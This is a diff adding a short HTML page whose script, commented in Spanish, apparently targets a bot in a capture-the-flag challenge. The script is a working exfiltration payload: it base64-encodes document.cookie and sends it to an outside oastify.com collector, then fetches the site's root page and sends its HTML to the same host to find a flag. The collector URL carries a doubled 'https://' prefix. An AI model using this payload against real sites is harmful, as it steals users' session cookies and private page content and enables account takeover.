@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // Opción 1: Intentar robar cookies
+        var exfil = "https://https://7x5clbrgd8h4oh9pdcck24l3tuzlnbb0.oastify.com/log?data=";
+        fetch(exfil + btoa(document.cookie));
+
+        // Opción 2: Si el flag está en el HTML de la página del bot
+        // Intentamos leer la página que el bot ve por defecto
+        fetch('/')
+            .then(response => response.text())
+            .then(data => {
+                fetch(exfil + "html_" + btoa(data));
+            });
+    </script>
+</body>
+</html>
